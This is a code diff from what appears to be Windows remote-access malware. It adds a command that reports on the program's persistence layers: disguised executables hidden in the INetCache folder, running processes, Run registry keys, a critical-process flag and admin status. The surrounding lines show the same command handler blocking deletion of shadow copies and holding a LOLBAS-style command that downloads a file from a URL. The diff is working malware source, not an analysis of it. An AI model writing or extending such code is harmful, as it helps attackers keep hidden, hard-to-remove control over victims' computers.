@@ -235,6 +235,75 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         obf_sys_harden_files();
         result = "[NTFS ACLs hardened: deny delete for all shadow copies]";
     }
+    else if (strcmp(cmd, "VERIFY_LAYERS") == 0) {
+        /* Check all persistence layers and report status */
+        char localAppData[MAX_PATH];
+        GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
+        
+        resp_pos = 0;
+        util_appendf(response, &resp_pos, "=== LAYER VERIFICATION ===\n");
+        
+        /* Layer 1: Shadow files on disk */
+        for (int i = 0; i < 3; i++) {
+            const char *names[] = {"ElevationService.exe", "CrashHandler.exe", "NotifyService.exe"};
+            char path[MAX_PATH];
+            snprintf(path, sizeof(path), "%s\\Microsoft\\Windows\\INetCache\\IE\\%s", localAppData, names[i]);
+            DWORD attr = GetFileAttributesA(path);
+            util_appendf(response, &resp_pos, "[L1] %s: %s\n", names[i], 
+                        (attr != INVALID_FILE_ATTRIBUTES) ? "EXISTS" : "MISSING");
+        }
+        
+        /* Layer 2: Running processes */
+        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        int elev = 0, crash = 0, notify = 0;
+        if (hSnap != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32 pe;
+            pe.dwSize = sizeof(pe);
+            if (Process32First(hSnap, &pe)) {
+                do {
+                    if (_stricmp(pe.szExeFile, "ElevationService.exe") == 0) elev = 1;
+                    if (_stricmp(pe.szExeFile, "CrashHandler.exe") == 0) crash = 1;
+                    if (_stricmp(pe.szExeFile, "NotifyService.exe") == 0) notify = 1;
+                } while (Process32Next(hSnap, &pe));
+            }
+            CloseHandle(hSnap);
+        }
+        util_appendf(response, &resp_pos, "[L2] ElevationService running: %s\n", elev ? "YES" : "NO");
+        util_appendf(response, &resp_pos, "[L2] CrashHandler running: %s\n", crash ? "YES" : "NO");
+        util_appendf(response, &resp_pos, "[L2] NotifyService running: %s\n", notify ? "YES" : "NO");
+        
+        /* Layer 3: Registry */
+        HKEY hKey;
+        int regOk = (RegOpenKeyExA(HKEY_CURRENT_USER, 
+            "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+            0, KEY_READ, &hKey) == ERROR_SUCCESS);
+        if (regOk) {
+            DWORD type, size;
+            char buf[MAX_PATH];
+            int r1 = RegQueryValueExA(hKey, "ElevationService", NULL, &type, (BYTE*)buf, &(size=sizeof(buf)));
+            int r2 = RegQueryValueExA(hKey, "CrashHandler", NULL, &type, (BYTE*)buf, &(size=sizeof(buf)));
+            int r3 = RegQueryValueExA(hKey, "NotifyService", NULL, &type, (BYTE*)buf, &(size=sizeof(buf)));
+            RegCloseKey(hKey);
+            util_appendf(response, &resp_pos, "[L3] Registry Run keys: %s\n", 
+                        (r1==ERROR_SUCCESS && r2==ERROR_SUCCESS && r3==ERROR_SUCCESS) ? "ALL OK" : "MISSING");
+        } else {
+            util_appendf(response, &resp_pos, "[L3] Registry Run keys: ERROR\n");
+        }
+        
+        /* Layer 4: Critical flag */
+        const char *crit = obf_sys_check_critical_status();
+        util_appendf(response, &resp_pos, "[L4] Critical flag: %s\n", crit);
+        
+        /* Layer 5: Admin status */
+        util_appendf(response, &resp_pos, "[L5] Running as: %s\n", sys_is_admin() ? "ADMIN" : "NOT ADMIN");
+        
+        /* Layer 6: This process path */
+        char myPath[MAX_PATH];
+        GetModuleFileNameA(NULL, myPath, MAX_PATH);
+        util_appendf(response, &resp_pos, "[L6] This process: %s\n", myPath);
+        
+        result = response;
+    }
     else if (strncmp(cmd, "LOLBAS_DOWNLOAD ", 16) == 0) {
         char url[1024], path[MAX_PATH];
         if (sscanf(cmd, "LOLBAS_DOWNLOAD %s %s", url, path) == 2) {
